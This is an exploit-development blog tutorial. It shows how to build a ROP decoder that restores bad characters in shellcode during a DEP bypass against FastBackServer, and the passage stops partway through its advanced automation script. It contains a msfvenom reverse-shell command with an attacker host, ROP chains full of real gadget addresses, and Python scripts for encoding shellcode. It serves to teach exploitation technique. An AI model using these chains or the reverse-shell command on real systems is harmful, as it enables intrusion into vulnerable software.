---
title: "ROPGadget: Writing a ROPDecoder"
classes: wide
header:
  teaser: /assets/images/ropdecoder.png
ribbon: red
description: "An in-depth blog on how to create a ROPDecoder."
categories:
  - Exploit Development
tags:
  - Exploit Development
  - ROP
  - ROPGadget
  - Exploitation
  - zero day
  - 0day
  - cve
toc: true
---
# Introduction
Welcome All!, In this blog post we will be talking about creating a `ROPDecoder` from scratch as many people face issues in understand the automated process of it. 	And note that you must know how to bypass `DEP` and what's `ROPGadgets`, We wil be Starting from selecting our `ROP` Gadget, Going to encoding and decoding our shellcode manually, Then moving further to automate the process in 2 ways, A basic way that still needs a small interaction from us, And more advanced way that automate it by `90%`, And we would just need to provide our Gadget to it. 
# The Case
Why do we need to have a `ROPDecoder` ?, First, We need to fix the bad characters problems, So when we are generating a shellcode using `msfvenom` as example, We always provide the bad characters that could crash our exploit using `-b` argument (`ex: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.6 LPORT=1337 -b "\x00\x20\x21"`), What will happen here is that the `encoder` will encode these bad characters, After that during the runtime or the execution of the shellcode the shellcode will retrive the encoded bad characters and then complete the execution, But when we are bypassing mitigations like `DEP` using `WriteProcessMemory` API, Our exploit will crash, As the goal of this API is to write data from place to another in the memory, The place that the API will write to, Have to be marked with execution permissions, And such locations in memory are in the `.text` or code section of the software So, The issue with it is that the location is not writable (During the execution of `WriteProcessMemory` it will change the location permission to writable and after writing the data, It will retrive the old permissions to it), Therefor, As the location is not writable, Then when the decoder in the shellcode try to replace the bad characters which requires to write or change in it's place, It needs write permissions which are not avaliable. As a result, It will cause a crash and won't be executed and `Access Violation` will be rasied.

# Weponizing w/ Gadgets
We will be using `FastBackServer` as our target, First we need to get our own gadget from one of `FastBackServer` modules, Here i picked up `CSFTPAV6.dll` module. When we are decoding our shellcode, We have to focus on the following type of gadgets:

- `add byte [reg]`
- `add byte [reg{+/-}{offset/reg}]`
- `sub byte [reg]`
- `sub byte [reg{+/-}{offset/reg}]`

And also we could use other gadgets if we can't find the above ones, Such as:

- `ror`
- `rol`
- `shr`
- `shl`
- `or`
- `and`

But, In my case i found many gadgets as the following:
```
0x5051f2be: add byte [esi+0x5D], bl ; ret  ;  (1 found)
0x50541fae: add byte [esi+0x5D], bl ; ret  ;  (1 found)
0x50516959: add byte [esi+0x5F], bl ; ret  ;  (1 found)
0x50526766: add byte [esi+0x5F], bl ; ret  ;  (1 found)
.....
0x5054348e: add byte [edx], bh ; ret  ;  (1 found)
0x50549016: add byte [edx], bh ; ret  ;  (1 found)
0x50548ec4: add byte [edx], bh ; ret  ;  (1 found)
0x50548f39: add byte [edx], bh ; ret  ;  (1 found)
0x505490a2: add byte [edx], bh ; ret  ;  (1 found)
......
0x505229c2: add byte [edx], ch ; ret  ;  (1 found)
0x50523aec: add byte [edx], ch ; ret  ;  (1 found)
0x5050626e: add byte [esi+0x3B], ah ; ret  ;  (1 found)
......
```

I will pick up `0x5050626e: add byte [esi+0x3B], ah ; ret  ;` as a decoding gadget, specially, in my case the `esi` register has is used as the pointer to patch the arguments in my `ROPGadget`; `0x5051cbb6: mov dword [esi], eax ; ret  ;`, And also it's using the value in `ah` to be added where `esi+0x3B` points to, As i do have control over `eax` and i can pop any value into it, Then we are good to go and use this gadget. Now, We would need the following steps to perform a successful decoding for the bad characters:
1. Make `esi+0x3B` point to the bad character.
2. Pop our decoding value into `eax`.
3. Add the value of `ah` into where `esi+0x3B` is pointing.
4. Move to the next bad character and decode it..

As there are no gadgets that perform direct operations on `esi` to make it point where we need, Then we will use the following gadgets:
```
#0x5050118e: mov eax, esi ; pop esi ; ret  ;  (1 found)
#0x5052db24: pop ecx ; ret  ;
#0x50533bf4: sub eax, ecx ; ret  ;  (1 found)
#0x505263f9: push eax ; pop esi ; pop ebx ; ret  ;  (1 found)
#0x5053a0f5: pop eax ; ret  ;  (1 found)
#0x5050626e: add byte [esi+0x3B], ah ; ret  ;
```
1. `0x5050118e: mov eax, esi ; pop esi ; ret  ;`
	- Here we would move the value in `esi` (which has the `esp` value before) into `eax`, And pop a dummy value into `esi`.
2. `0x5052db24: pop ecx ; ret  ;`
	- Next, We will pop the negative offset value to the bad characters into `ecx`, As the positive value would contain bad characters & also NULL-Byte.
3. `0x50533bf4: sub eax, ecx ; ret  ;`
	- After that we will subtract the value in `ecx` from `eax`, Which means if we have `-0x01` in `ecx`, It will add it to `eax` (e.x:`0x1`, As it's negative value and we are using `sub` instruction, Then negative and negative will result in `add` operation..
4. `0x505263f9: push eax ; pop esi ; pop ebx ; ret  ;  (1 found)`
	- Then we moving the value in `eax` to `esi`, By pushing `eax` it into the stack & pop it into `esi`, So now `esi` will point to the bad characters and We will provide dummy value into `ebx`.
5. `0x5053a0f5: pop eax ; ret  ;`
	- Moving to poping the decoding value into `eax`.
6. `0x5050626e: add byte [esi+0x3B], ah ; ret  ;`
	- Finally, Apply the decoding gadget.
7. `0x5051579a: add eax, ecx ; ret  ;`:
	- For adding the previous
# Manually Encoding/Decoding
After getting our gadget and make sure it doesn't has any bad characters, Which in my case are `"\x00\x09\x0a\x0b\x0c\x0d\x20"`. Now, Our full gadget is as the following:
```python
ROPDecoder = pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", negative_offset_value_to_shellcode)
ROPDecoder += pack("<L", 0x50533bf4) # sub eax, ecx ; ret  ; add the offset to eax
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", decoding_value)
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bbad character
```


## Encoding
Now, It's time to generate our shellcode, And for our testing case, We will use `Windows/exec` payload for now. And we will use it just to pop a calculator:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/f99e01ab-7cf9-47b1-bd7f-66a8b96289c3)


We can notice donz of bad characters that will crash our exploit, So, When we comme to encoding bad characters manually we need to replace it with a value that not considered as a bad character. For example we can add `1` or subtract `1` from our bad character. Taking `\x00` as example if we add `1` to it, It will be `\x01` or subtract `1` it will be `\xff` which not consider a bad character in both cases. And then when we are decoding it, We will add also `1` or subtract `1`. But, In our case it won't be a good idea, As if we apply it for `\x09` it will turn to `\0x0a` if we added one. Also the same for `\x0a`, If we added one again or subtract one, It will turn into bad character. To fix this issue we will deal with it by adding random value into each bad character and see the results, For now the only bad characters that are exist in our shellcode are: `\x00x0a\x0c\x0d\x20`. As we mentioned before we can't add or subtract `1` in our case, Also the positive decoding value would result in NULL-Bytes, Then our random value can start from negative values from `0xff` till `0x01` as we can't use `0xff` (which is `-1`) or `0x01`, We would start with `0xfe`:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/3390b767-81dd-4130-bfdc-1eba9869cf22)


When we arrive to `\x0c` (Ignore all bytes on the left we only focus on the last one on the right), It results in `0x0a` which is a bad character, So we will go to the next value which is `0xfd`:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/62b8221e-7a23-4e05-85ec-d52eeccad594)


Again, When we arrive to `\x0c`, It gives us `0x09` which also consider as a bad character. Then we will move with the next value which is `0xfc`:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/dc747910-15ab-41bc-94ea-941614a7dd20)


When we arrive to `\x0d`, It gives us `0x09` which also consider as a bad character. Then we will move with the next value which is `0xfb`:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/70ee438f-fc3e-4ff4-9f65-4bfe3305d78c)


Here we can see clearly that `0xfb` works with us, And results in no bad characters So we can encode the bad characters with the new values, That we have got from the addition process with `0xfb`:

```
# Encoding (replacement) for the bad characters:
0x00 -> 0xfd
0x0a -> 0x05
0x0c -> 0x07
0x0d -> 0x08
0x20 -> 0x1b
```

Now, Let's replace/encode our bad characters:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/169fe5ba-c40e-4891-90b0-b8e74a92c6e7)


We replaced/encoded the bad characters with the results we have got.
## Decoding
Now, Before we decode our shellcode, We need to have 2 things:
- The offset/index for each bad character.
- The positive value for `0xfb` that we used in encoding.
Note:
```
If we have a `sub` gadget we could sub directly with the same value we used for encoding, In this case `0xfb`.
```
Let's go and get these 2 things done.
### Bad character index/offset
First, Starting with getting the index for each bad character, We can split it from `\x` and replace it with a new line to see the number of the line for each bad charachter:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/a45bc268-bfe1-455c-b529-2489b22a8b2d)


We can see clearly that the number of lines for our shellcode after split is `193`, Which iss our shellcode size. Now, Let's search for all bad chars and check the indexs.. We will start with `0x00`:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/6b6703c7-cb1d-4d22-8669-0b8a4180392b)


It exists at index `4`,`5`,`6`:



![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/ce5f808b-f900-4a69-9f90-4d3dfca8e8b3)


Also again at index `143`, `144`, `145`, `181` and `193`. Moving to the next one `0x0a`:



![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/a5586ab1-bb24-480b-8a98-9d98f5a5dd51)


Only exist at index `169`. And we will repeat the process for each one until we finish. After finishing it we will get the following results:
| Character | indexes |
 |-----|-----|
 |0x00|4, 5, 6, 143, 144, 145, 181, 193|
 |0x0a|169|
 |0x0c|18, 106|
 |0x0d|40, 83|
 |0x20|37, 64|

After getting all the indexes for each bad character, Let's arrange it in decending order:

```
193
181
169
145
144
143
106
83
64
40
37
18
6
5
4
```

And the reason behind that is that we will start decoding from the last bad character, And then jump backward to the other bad characters, So will just add negative value to the pointer to jump backward, For example:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/b3fef5c1-4905-4bfa-818d-68ed8882343b)


Here we can see that `ESI` points to the last encoded bad char `0xfb` which is at index `193`, To move to the previous bad chars for example the one at index `181` we need to calculate the differance between the bad char at index `193` and the one at index `181`, Which will be `193 - 181 = 12`, Then to jummp back from bad char at index `193` after decoding we need to jump back `12` bytes. And repeat the process between each 2 indexes till we finish. After repeating the process and finish we would have the following:

|Index/offset | differance |
|-----|-----|
|193 - 181| 12|
|181 - 169| 12|
|169 - 145|24|
|145 - 144 | 1 |
| 144 -143 | 1 |
|143 - 106| 37|
|106 - 83|23|
|83 - 64|19|
|64 - 40|24|
|40-37|3|
| 37 - 18 |19|
| 18 - 6 |12|
| 6 - 5 |1|
| 5 - 4 |1|

Now, After getting the differance between indexes, We can now make it into the negative value in hex to use it for jumping backward while decoding:

|Index/offset | differance | differance value in Negative hex  |
|-----|-----|-----|
|193 - 181| 12| 0xfffffff4|
|181 - 169| 12|0xfffffff4|
|169 - 145|24|0xffffffe8|
|145 - 144 | 1 | 0xffffffff|
| 144 -143 | 1 |0xffffffff|
|143 - 106| 37|0xffffffdb|
|106 - 83|23|0xffffffe9|
|83 - 64|19|0xffffffed|
|64 - 40|24|0xffffffe8|
|40-37|3|0xfffffffd|
| 37 - 18 |19|0xffffffed|
| 18 - 6 |12| 0xfffffff4|
| 6 - 5 |1|0xffffffff|
| 5 - 4 |1|0xffffffff|
### Positive value & Verify decoding
Secondly, We need to get the positive value for `0xfb` as we used it for encoding, Our decoding gadget is `add` gadget, So we need to get the positive value for `0xfb`:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/bdab2e2a-f901-4831-9135-e72f4f59be92)


Here the positive value for `0xfb` is `0x05`, So we will be using `0x05050505` as the value to be poped into `eax` (As `eax` is 32-bit we used `05050505` to cover all bits) While we are decoding. Before that, Let'ss verify that the value would wwork and decode the encoded bad chars to the actual original ones:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/cb65576c-7413-4505-9662-64a3d69731a7)


We can see clearly, when we added `0x05` to each encoded bad char, It successfully gives us the original bad char and decoded it successsfully.

Our full gadget will be as the following for decoding the badchars,But The first decode will have 1 differant gadget to make the esi point to the last badchar:
```python
# Decode bad character at index 193
ROPDecoder = pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", negative_offset_value_to_shellcode)
ROPDecoder += pack("<L", 0x50533bf4) # sub eax, ecx ; ret  ; add the offset to eax
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", decoding_value)
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bbad character
```

Then as now we are pointing with-in the shellcode, We can jump backward for all the badchars using the following gadget:

```python
# Decode bad character at index 181
ROPDecoder = pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", negative_offset_value_to_the_previous_badchar)
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", decoding_value)
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bbad character
```

Now the full gadget to decode all bad characters, Would be as the following:

```python
# Decode bad character at index 193
ROPDecoder = pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", negative_offset_value_to_shellcode)
ROPDecoder += pack("<L", 0x50533bf4) # sub eax, ecx ; ret  ; add the offset to eax
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", decoding_value)
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bbad character

# Decode bad char at index 181
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xfffffff4) # offset to bad char at index 181
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 169
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xfffffff4) # offset to bad char at index 169
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 145
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffe8) # offset to bad char at index 145
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 144
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffff) # offset to bad char at index 144
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 143
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffff) # offset to bad char at index 143
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 106
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffdb) # offset to bad char at index 106
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 83
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffe9) # offset to bad char at index 83
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 64
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffed) # offset to bad char at index 64
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 40
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffe8) # offset to bad char at index 40
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 37
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xfffffffd) # offset to bad char at index 37
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 18
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffed) # offset to bad char at index 18
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 6
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xfffffff4) # offset to bad char at index 6
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 5
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffff) # offset to bad char at index 5
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
    


# Decode bad char at index 4
ROPDecoder += pack("<L", 0x5050118e) # mov eax, esi ; pop esi ; ret  ;
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop esi
ROPDecoder += pack("<L", 0x5052db24) # pop ecx ; ret  ;
ROPDecoder += pack("<L", 0xffffffff) # offset to bad char at index 4
ROPDecoder += pack("<L", 0x5051579a) # add eax, ecx ; ret  ; Make eax point to the badchar to decode
ROPDecoder += pack("<L", 0x505263f9) # push eax ; pop esi ; pop ebx ; ret  ; get back the pointer to ESI
ROPDecoder += pack("<L", 0x41414141) # dummy value for pop ebx
ROPDecoder += pack("<L", 0x5053a0f5) # pop eax ; ret  ;
ROPDecoder += pack("<L", 0x05050505) # decoding value
ROPDecoder += pack("<L", 0x5050626e) # add byte [esi+0x3B], ah ; ret  ; decode the bad character
```
# Automate The Process

We can say that we understood it manually very well, Now we can move to automate all this process in 2 different ways.

## The Basic Way

The first way is the basic way, Which will just help us in identifying the index for each bad char and encode it for us, And give us the encoded shellcode.
```python
def encode_shellcode(shellcode, badchars, encode_value):
    shellcode_bytes = shellcode.split("\\x")

    encoded_shellcode = []
    index = 0
    for byte in shellcode_bytes:
        if byte:
            if byte in badchars:
                encoded_int = (int(byte, 16) + encode_value) & 0xFF
                encoded_hex = hex(encoded_int)[2:]
                encoded_hex = encoded_hex.zfill(2)
                print(f"[!] Bad char \\x{byte} at index {index} Encoded to 0x{encoded_hex}")
                encoded_shellcode.append(f"\\x{encoded_hex}")
            else:
                encoded_shellcode.append(f"\\x{byte}")
        index += 1

    encoded_shellcode_str = ''.join(encoded_shellcode)
    print("[+] Encoded Shellcode: shellcode = b\""+encoded_shellcode_str+"\"")
    return encoded_shellcode_str

with open("shellcode.txt", "r") as file:
    my_shellcode = file.read()
    print("[+] Shellcode:", my_shellcode)

badchars= ["00", "09", "0a", "0b", "0c", "0d", "20"]
encoded_shellcode = encode_shellcode(my_shellcode, badchars, 0xfb)
```

Here I created a function that takes 3 arguments, `shellcode` which is the file that has our shellcode, `badchars` which is array contains all the badchars, `encode_value` the value we wish to use for our encoding process. The function will take the shellcode and split it with `\x` which will put each byte in array, Then going through each element of the array, While checking if the element (`byte`) is in the `badchars` array, It will take the `encoded_byte` and perform the same operation we did before in encoding value manually, Then it will get the result and use it as encoding char instead of the bad one. At the same time, It will tell us the index of the badchar and repeat the process until it give us the new `encoded_shellcode`:

![image](https://github.com/Zeyad-Azima/Zeyad-Azima.github.io/assets/62406753/5934ff21-664d-41aa-ac25-5efb737796d2)


Now, We can repeat the same process from the manual way
## The Advanced Way
Now, In this way we will automate mostly 90% of everything. We will start by using the ssame encoding function in the basic way, Then we will add a function to create the gadget for us automatically:
```python
from struct import pack
def encode_shellcode(shellcode, badchars, encode_value):
    shellcode_bytes = shellcode.split("\\x")

    bad_index = []
    encoded_shellcode = []
    index = 0
    for byte in shellcode_bytes:
        if byte:
            if byte in badchars:
                encoded_int = (int(byte, 16) + encode_value) & 0xFF
                encoded_hex = hex(encoded_int)[2:]
                encoded_hex = encoded_hex.zfill(2)
                print(f"[!] Bad char \\x{byte} at index {index} Encoded to 0x{encoded_hex}")
                encoded_shellcode.append(f"\\x{encoded_hex}")
                bad_index.append(index)
            else:
                encoded_shellcode.append(f"\\x{byte}")
        index += 1

    encoded_shellcode_str = ''.join(encoded_shellcode)
    print("[+] Encoded Shellcode: shellcode = b\""+encoded_shellcode_str+"\"")
    bad_index.remove(bad_index[-1])
    return encoded_shellcode_str, bad_index

def create_gadget(decode_value, result , bit_width=32):
    hex_result = hex(result)
    mask = (2 ** bit_width) - 1
    negative_hex_result = hex((result) & mask)
    print(f"Result of subtraction: {result}")
    print(f"Hexadecimal representation: {hex_result}")
    print(f"Negative hexadecimal representation: {negative_hex_result}")
    ROPDecoder = pack("<L", 0x5050118e)  # mov eax, esi ; pop esi ; ret  ;
    ROPDecoder += pack("<L", 0x41414141)  # dummy value for pop esi
    ROPDecoder += pack("<L", 0x5052db24)  # pop ecx ; ret  ;
    ROPDecoder += pack("<L", int(negative_hex_result, 16))  # offset to bad char at index
